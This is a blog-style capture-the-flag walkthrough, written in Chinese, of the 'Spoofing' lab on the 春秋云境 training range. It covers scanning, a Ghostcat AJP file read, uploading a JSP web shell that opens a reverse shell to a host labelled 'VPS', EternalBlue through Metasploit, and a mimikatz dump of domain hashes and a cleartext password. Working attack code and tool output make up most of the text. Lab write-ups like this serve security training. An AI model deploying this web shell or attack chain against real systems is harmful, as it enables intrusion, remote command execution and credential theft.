---
typora-root-url: 春秋云境Spoofing
title: 春秋云境Spoofing
toc: true
categories:
  - 渗透测试
date: 2026-03-17 22:15:08
tags: 
  - 渗透测试
---

# 春秋云境Spoofing

fscan扫

```
E:\Users\tiand>fscan -h 39.99.131.161
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.1

[795ms]     已选择服务扫描模式
[795ms]     开始信息扫描
[795ms]     最终有效主机数量: 1
[795ms]     开始主机扫描
[796ms]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
[796ms]     有效端口数量: 233
[960ms] [*] 端口开放 39.99.131.161:8009
[970ms] [*] 端口开放 39.99.131.161:22
[970ms] [*] 端口开放 39.99.131.161:8080
[3.8s]     扫描完成, 发现 3 个开放端口
[3.8s]     存活端口数量: 3
[3.8s]     开始漏洞扫描
[3.8s]     POC加载完成: 总共387个，成功387个，失败0个
[4.7s] [*] 网站标题 http://39.99.131.161:8080 状态码:200 长度:7091   标题:后台管理
[22.3s]     扫描已完成: 5/5
```

nmap

```
nmap -T4 -A -v -Pn --unprivileged 39.99.131.161

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-17 13:21 中国标准时间
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 13:21
Completed NSE at 13:21, 0.00s elapsed
Initiating NSE at 13:21
Completed NSE at 13:21, 0.00s elapsed
Initiating NSE at 13:21
Completed NSE at 13:21, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 13:21
Completed Parallel DNS resolution of 1 host. at 13:21, 0.59s elapsed
Initiating Connect Scan at 13:21
Scanning 39.99.131.161 [1000 ports]
Discovered open port 8080/tcp on 39.99.131.161
Discovered open port 22/tcp on 39.99.131.161
Discovered open port 8009/tcp on 39.99.131.161
Completed Connect Scan at 13:21, 12.92s elapsed (1000 total ports)
Initiating Service scan at 13:21
Scanning 3 services on 39.99.131.161
Completed Service scan at 13:21, 12.96s elapsed (3 services on 1 host)
NSE: Script scanning 39.99.131.161.
Initiating NSE at 13:21
Completed NSE at 13:21, 5.15s elapsed
Initiating NSE at 13:21
Completed NSE at 13:21, 0.47s elapsed
Initiating NSE at 13:21
Completed NSE at 13:21, 0.00s elapsed
Nmap scan report for 39.99.131.161
Host is up (0.092s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ba:9e:8c:02:06:f6:07:64:af:66:64:ff:fd:7c:2b:a8 (RSA)
|   256 38:af:5d:33:2d:9e:f2:00:00:4e:85:8c:66:46:63:07 (ECDSA)
|_  256 6f:65:14:7b:9e:68:1c:14:a7:05:a8:9c:f4:fe:ef:20 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: OPTIONS GET HEAD POST
8080/tcp open  http    Apache Tomcat (language: en)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: \xE5\x90\x8E\xE5\x8F\xB0\xE7\xAE\xA1\xE7\x90\x86
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 13:21
Completed NSE at 13:21, 0.00s elapsed
Initiating NSE at 13:21
Completed NSE at 13:21, 0.00s elapsed
Initiating NSE at 13:21
Completed NSE at 13:21, 0.00s elapsed
Read data files from: D:\Program Files (x86)\Nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.87 seconds

```

## Tomcat ajp Ghostcat

有Tomcat的ajp协议，可以尝试Ghostcat：https://github.com/00theway/Ghostcat-CNVD-2020-10487

看到需要上传一个恶意文件然后执行，扫一下目录找上传点，没找到

读配置文件WEB-INF/web.xml找上传接口

```
E:\exploit\tools\Ghostcat-CNVD-2020-10487> python ajpShooter.py http://39.98.112.38:8080/ 8009 /WEB-INF/web.xml read

       _    _         __ _                 _
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|
         |__/|_|
                                                00theway,just for test


[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"2489-1670857638305"
[<] Last-Modified: Mon, 12 Dec 2022 15:07:18 GMT
[<] Content-Type: application/xml
[<] Content-Length: 2489

<!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd" >

<web-app>
  <display-name>Archetype Created Web Application</display-name>

  <security-constraint>
    <display-name>Tomcat Server Configuration Security Constraint</display-name>
    <web-resource-collection>
      <web-resource-name>Protected Area</web-resource-name>
      <url-pattern>/upload/*</url-pattern>
    </web-resource-collection>
    <auth-constraint>
      <role-name>admin</role-name>
    </auth-constraint>
  </security-constraint>

  <error-page>
    <error-code>404</error-code>
    <location>/404.html</location>
  </error-page>

  <error-page>
    <error-code>403</error-code>
    <location>/error.html</location>
  </error-page>

  <error-page>
    <exception-type>java.lang.Throwable</exception-type>
    <location>/error.html</location>
  </error-page>

  <servlet>
    <servlet-name>HelloServlet</servlet-name>
    <servlet-class>com.example.HelloServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>HelloServlet</servlet-name>
    <url-pattern>/HelloServlet</url-pattern>
  </servlet-mapping>

  <servlet>
    <display-name>LoginServlet</display-name>
    <servlet-name>LoginServlet</servlet-name>
    <servlet-class>com.example.LoginServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>LoginServlet</servlet-name>
    <url-pattern>/LoginServlet</url-pattern>
  </servlet-mapping>

  <servlet>
    <display-name>RegisterServlet</display-name>
    <servlet-name>RegisterServlet</servlet-name>
    <servlet-class>com.example.RegisterServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>RegisterServlet</servlet-name>
    <url-pattern>/RegisterServlet</url-pattern>
  </servlet-mapping>

  <servlet>
    <display-name>UploadTestServlet</display-name>
    <servlet-name>UploadTestServlet</servlet-name>
    <servlet-class>com.example.UploadTestServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>UploadTestServlet</servlet-name>
    <url-pattern>/UploadServlet</url-pattern>
  </servlet-mapping>

  <servlet>
    <display-name>DownloadFileServlet</display-name>
    <servlet-name>DownloadFileServlet</servlet-name>
    <servlet-class>com.example.DownloadFileServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>DownloadFileServlet</servlet-name>
    <url-pattern>/DownloadServlet</url-pattern>
  </servlet-mapping>
</web-app>
```

有/UploadServlet, https://www.revshells.com/生成木马jsp改jpg传上去

```
<%
    /*
     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.
     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.
     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button "send" is clicked, it will try to connect to the reverse shell again (apart from executing 
     * the command specified in the HTML form). This is to avoid to keep it simple.
     */
%>

<%@page import="java.lang.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%@page import="java.util.*"%>

<html>
<head>
    <title>jrshell</title>
</head>
<body>
<form METHOD="POST" NAME="myform" ACTION="">
    <input TYPE="text" NAME="shell">
    <input TYPE="submit" VALUE="Send">
</form>
<pre>
<%
    // Define the OS
    String shellPath = null;
    try
    {
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
            shellPath = new String("/bin/sh");
        } else {
            shellPath = new String("cmd.exe");
        }
    } catch( Exception e ){}
    // INNER HTML PART
    if (request.getParameter("shell") != null) {
        out.println("Command: " + request.getParameter("shell") + "\n<BR>");
        Process p;
        if (shellPath.equals("cmd.exe"))
            p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("shell"));
        else
            p = Runtime.getRuntime().exec("/bin/sh -c " + request.getParameter("shell"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
        }
    }
    // TCP PORT PART
    class StreamConnector extends Thread
    {
        InputStream wz;
        OutputStream yr;
        StreamConnector( InputStream wz, OutputStream yr ) {
            this.wz = wz;
            this.yr = yr;
        }
        public void run()
        {
            BufferedReader r  = null;
            BufferedWriter w = null;
            try
            {
                r  = new BufferedReader(new InputStreamReader(wz));
                w = new BufferedWriter(new OutputStreamWriter(yr));
                char buffer[] = new char[8192];
                int length;
                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )
                {
                    w.write( buffer, 0, length );
                    w.flush();
                }
            } catch( Exception e ){}
            try
            {
                if( r != null )
                    r.close();
                if( w != null )
                    w.close();
            } catch( Exception e ){}
        }
    }
 
    try {
        Socket socket = new Socket( "VPS", 9000 ); // Replace with wanted ip and port
        Process process = Runtime.getRuntime().exec( shellPath );
        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
        out.println("port opened on " + socket);
     } catch( Exception e ) {}
%>
</pre>
</body>
</html>
```

```
connect to [172.31.15.71] from (UNKNOWN) [39.98.112.38] 43068
whoami
root
ls /root
flag
cat /root/flag/f*
  ████████                             ████ ██
 ██░░░░░░  ██████                     ░██░ ░░            █████
░██       ░██░░░██  ██████   ██████  ██████ ██ ███████  ██░░░██
░█████████░██  ░██ ██░░░░██ ██░░░░██░░░██░ ░██░░██░░░██░██  ░██
░░░░░░░░██░██████ ░██   ░██░██   ░██  ░██  ░██ ░██  ░██░░██████
       ░██░██░░░  ░██   ░██░██   ░██  ░██  ░██ ░██  ░██ ░░░░░██
 ████████ ░██     ░░██████ ░░██████   ░██  ░██ ███  ░██  █████
░░░░░░░░  ░░       ░░░░░░   ░░░░░░    ░░   ░░ ░░░   ░░  ░░░░░

This is the first flag you get.

flag01: flag{8da46caa-45b3-461a-86b8-8ee6c9cd7c42}
```

传fscan扫内网搭代理

```
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:22:51:40 brd ff:ff:ff:ff:ff:ff
    inet 172.22.11.76/16 brd 172.22.255.255 scope global dynamic eth0
       valid_lft 1892158259sec preferred_lft 1892158259sec
    inet6 fe80::216:3eff:fe22:5140/64 scope link
       valid_lft forever preferred_lft forever
./fscan -h 172.22.11.76/24
start infoscan
(icmp) Target 172.22.11.6     is alive
(icmp) Target 172.22.11.76    is alive
(icmp) Target 172.22.11.45    is alive
(icmp) Target 172.22.11.26    is alive
[*] Icmp alive hosts len is: 4
172.22.11.26:445 open
172.22.11.6:445 open
172.22.11.26:135 open
172.22.11.6:139 open
172.22.11.45:135 open
172.22.11.6:135 open
172.22.11.26:139 open
172.22.11.45:139 open
172.22.11.76:22 open
172.22.11.76:8080 open
172.22.11.6:88 open
172.22.11.45:445 open
172.22.11.76:8009 open
[*] alive ports len is: 13
start vulscan
[*] NetInfo
[*]172.22.11.26
   [->]XR-LCM3AE8B
   [->]172.22.11.26
[*] NetBios 172.22.11.6     [+] DC:XIAORANG\XIAORANG-DC
[*] NetBios 172.22.11.45    XR-DESKTOP.xiaorang.lab             Windows Server 2008 R2 Enterprise 7601 Service Pack 1
[*] NetInfo
[*]172.22.11.6
   [->]XIAORANG-DC
   [->]172.22.11.6
[+] MS17-010 172.22.11.45       (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
[*] NetBios 172.22.11.26    XIAORANG\XR-LCM3AE8B
[*] WebTitle http://172.22.11.76:8080  code:200 len:7091   title:后台管理
已完成 13/13
[*] 扫描结束,耗时: 8.236386924s

172.22.11.76
172.22.11.45（MS17-010）
172.22.11.26（XR-LCM3AE8B）
172.22.11.6（DC）
```

## MS17-010

```
msf exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploi
                                             t/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Wi
                                             ndows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach
                                             ines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Window
                                             s Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines
                                             .
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2
                                             008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     198.18.0.1       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploi
                                             t/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Wi
                                             ndows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach
                                             ines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Window
                                             s Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines
                                             .
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2
                                             008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/bind_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LPORT     4444             yes       The listen port
   RHOST                      no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 172.22.11.45
RHOSTS => 172.22.11.45
msf exploit(windows/smb/ms17_010_eternalblue) > run
[*] 172.22.11.45:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 172.22.11.45:445      - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)
[*] 172.22.11.45:445      - Scanned 1 of 1 hosts (100% complete)
[+] 172.22.11.45:445 - The target is vulnerable.
[*] 172.22.11.45:445 - Connecting to target for exploitation.
[+] 172.22.11.45:445 - Connection established for exploitation.
[+] 172.22.11.45:445 - Target OS selected valid for OS indicated by SMB reply
[*] 172.22.11.45:445 - CORE raw buffer dump (53 bytes)
[*] 172.22.11.45:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 172.22.11.45:445 - 0x00000010  30 30 38 20 52 32 20 45 6e 74 65 72 70 72 69 73  008 R2 Enterpris
[*] 172.22.11.45:445 - 0x00000020  65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 50  e 7601 Service P
[*] 172.22.11.45:445 - 0x00000030  61 63 6b 20 31                                   ack 1
[+] 172.22.11.45:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 172.22.11.45:445 - Trying exploit with 12 Groom Allocations.
[*] 172.22.11.45:445 - Sending all but last fragment of exploit packet
[*] 172.22.11.45:445 - Starting non-paged pool grooming
[+] 172.22.11.45:445 - Sending SMBv2 buffers
[+] 172.22.11.45:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 172.22.11.45:445 - Sending final SMBv2 buffers.
[*] 172.22.11.45:445 - Sending last fragment of exploit packet!
[*] 172.22.11.45:445 - Receiving response from exploit packet
[+] 172.22.11.45:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 172.22.11.45:445 - Sending egg to corrupted connection.
[*] 172.22.11.45:445 - Triggering free of corrupted buffer.
[*] Started bind TCP handler against 172.22.11.45:4444
[-] 172.22.11.45:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 172.22.11.45:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 172.22.11.45:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 172.22.11.45:445 - Connecting to target for exploitation.
[+] 172.22.11.45:445 - Connection established for exploitation.
[+] 172.22.11.45:445 - Target OS selected valid for OS indicated by SMB reply
[*] 172.22.11.45:445 - CORE raw buffer dump (53 bytes)
[*] 172.22.11.45:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 172.22.11.45:445 - 0x00000010  30 30 38 20 52 32 20 45 6e 74 65 72 70 72 69 73  008 R2 Enterpris
[*] 172.22.11.45:445 - 0x00000020  65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 50  e 7601 Service P
[*] 172.22.11.45:445 - 0x00000030  61 63 6b 20 31                                   ack 1
[+] 172.22.11.45:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 172.22.11.45:445 - Trying exploit with 17 Groom Allocations.
[*] 172.22.11.45:445 - Sending all but last fragment of exploit packet
[*] 172.22.11.45:445 - Starting non-paged pool grooming
[+] 172.22.11.45:445 - Sending SMBv2 buffers
[+] 172.22.11.45:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 172.22.11.45:445 - Sending final SMBv2 buffers.
[*] 172.22.11.45:445 - Sending last fragment of exploit packet!
[*] 172.22.11.45:445 - Receiving response from exploit packet
[+] 172.22.11.45:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 172.22.11.45:445 - Sending egg to corrupted connection.
[*] 172.22.11.45:445 - Triggering free of corrupted buffer.
[*] Sending stage (230982 bytes) to 172.22.11.45
[*] Meterpreter session 1 opened (127.0.0.1:19771 -> 172.22.11.45:4444) at 2026-03-17 14:47:16 +0800
[+] 172.22.11.45:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 172.22.11.45:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 172.22.11.45:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > setuid
[-] Unknown command: setuid. Did you mean getuid? Run the help command for more details.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 1048 created.
Channel 1 created.
Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����

C:\Windows\system32>dir C:\ /S /B|findstr flag
dir C:\ /S /B|findstr flag
C:\Users\Administrator\flag
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag02.txt.lnk
C:\Users\Administrator\flag\flag02.txt

C:\Windows\system32>type C:\Users\Administrator\flag\flag02.txt
type C:\Users\Administrator\flag\flag02.txt
                                                      ##
  :####:                                   :####      ##
 :######                                   #####      ##
 ##:  :#                                   ##
 ##        ##.###:    .####.    .####.   #######    ####     ##.####    :###:##
 ###:      #######:  .######.  .######.  #######    ####     #######   .#######
 :#####:   ###  ###  ###  ###  ###  ###    ##         ##     ###  :##  ###  ###
  .#####:  ##.  .##  ##.  .##  ##.  .##    ##         ##     ##    ##  ##.  .##
     :###  ##    ##  ##    ##  ##    ##    ##         ##     ##    ##  ##    ##
       ##  ##.  .##  ##.  .##  ##.  .##    ##         ##     ##    ##  ##.  .##
 #:.  :##  ###  ###  ###  ###  ###  ###    ##         ##     ##    ##  ###  ###
 #######:  #######:  .######.  .######.    ##      ########  ##    ##  .#######
 .#####:   ##.###:    .####.    .####.     ##      ########  ##    ##   :###:##
           ##                                                           #.  :##
           ##                                                           ######
           ##                                                           :####:


flag02: flag{35b58432-e4e2-499a-9e51-9d230e3fa788}
```

```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
Kiwi Commands
=============

    Command                   Description
    -------                   -----------
    creds_all                 Retrieve all credentials (parsed)
    creds_kerberos            Retrieve Kerberos creds (parsed)
    creds_livessp             Retrieve Live SSP creds
    creds_msv                 Retrieve LM/NTLM creds (parsed)
    creds_ssp                 Retrieve SSP creds
    creds_tspkg               Retrieve TsPkg creds (parsed)
    creds_wdigest             Retrieve WDigest creds (parsed)
    dcsync                    Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm               Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create      Create a golden kerberos ticket
    kerberos_ticket_list      List all kerberos tickets (unparsed)
    kerberos_ticket_purge     Purge any in-use kerberos tickets
    kerberos_ticket_use       Use a kerberos ticket
    kiwi_cmd                  Execute an arbitrary mimikatz command (unparsed)
    lsa_dump_sam              Dump LSA SAM (unparsed)
    lsa_dump_secrets          Dump LSA secrets (unparsed)
    password_change           Change the password/hash of a user
    wifi_list                 List wifi profiles/creds for the current user
    wifi_list_shared          List shared wifi profiles/creds (requires SYSTEM)

For more info on a specific command, use <command> -h or help <command>.

meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username     Domain    NTLM                              SHA1
--------     ------    ----                              ----
XR-DESKTOP$  XIAORANG  28035770f3abf147ec6a1ed6c2c237da  c987442fad0a0d1eb4a4ec1879a53980f74412f7
yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbbda91841  6b2838f81b57faed5d860adaf9401b0edb269a6f

wdigest credentials
===================

Username     Domain    Password
--------     ------    --------
(null)       (null)    (null)
XR-DESKTOP$  XIAORANG  88 92 ee bc 6e 2b 28 c8 a0 15 b5 8d da 30 aa af ce 47 32 4c 19 fc b2 df c0 04 bf b3 4f 55 85 cc 6e 5c 79 a
                       8 11 7d ff e7 f4 b6 3d 21 b2 bd a6 62 af 83 5e 0d 6e 17 af 8b 1d 14 ec da 4d 69 71 d8 63 36 65 02 57 77 a1
                        4e dc a2 0d 0f 06 28 a8 c6 ed 75 3b e5 b8 c4 3a 36 4d 68 65 f9 0e bd 95 aa 5e 02 11 76 bf f0 1a df 9d b2
                       5d 32 6a 4a b7 c7 ab 2c 70 18 47 21 4a 00 a8 77 1e 21 e4 00 84 2f d8 aa 04 02 7b 42 ed fa 25 de da fd e8 8
                       1 de b7 7e 82 9d f9 55 6a cb be 73 b7 39 af df 0b 48 37 aa a5 9b 5d 93 23 c6 20 77 7f 26 c8 40 84 c0 27 5b
                        1f 20 44 d9 73 61 e9 cf 0f 16 5b 98 c1 9d 5a 26 0b 47 68 34 09 dc 68 0f 90 d6 d1 05 d4 97 62 e2 4d 6a 7c
                       01 e4 74 48 3a bf 42 b8 50 fa 2a b3 19 65 d9 e9 a7 2d 38 52 03 68 e8 45 ef f7 3d 55
yangmei      XIAORANG  xrihGHgoNZQ

kerberos credentials
====================

Username     Domain        Password
--------     ------        --------
(null)       (null)        (null)
xr-desktop$  XIAORANG.LAB  (null)
xr-desktop$  XIAORANG.LAB  88 92 ee bc 6e 2b 28 c8 a0 15 b5 8d da 30 aa af ce 47 32 4c 19 fc b2 df c0 04 bf b3 4f 55 85 cc 6e 5c
                           79 a8 11 7d ff e7 f4 b6 3d 21 b2 bd a6 62 af 83 5e 0d 6e 17 af 8b 1d 14 ec da 4d 69 71 d8 63 36 65 02
                           57 77 a1 4e dc a2 0d 0f 06 28 a8 c6 ed 75 3b e5 b8 c4 3a 36 4d 68 65 f9 0e bd 95 aa 5e 02 11 76 bf f0
                           1a df 9d b2 5d 32 6a 4a b7 c7 ab 2c 70 18 47 21 4a 00 a8 77 1e 21 e4 00 84 2f d8 aa 04 02 7b 42 ed fa
                           25 de da fd e8 81 de b7 7e 82 9d f9 55 6a cb be 73 b7 39 af df 0b 48 37 aa a5 9b 5d 93 23 c6 20 77 7f
                           26 c8 40 84 c0 27 5b 1f 20 44 d9 73 61 e9 cf 0f 16 5b 98 c1 9d 5a 26 0b 47 68 34 09 dc 68 0f 90 d6 d1
                           05 d4 97 62 e2 4d 6a 7c 01 e4 74 48 3a bf 42 b8 50 fa 2a b3 19 65 d9 e9 a7 2d 38 52 03 68 e8 45 ef f7
                           3d 55
yangmei      XIAORANG.LAB  xrihGHgoNZQ
```

域账户yangme:xrihGHgoNZQ
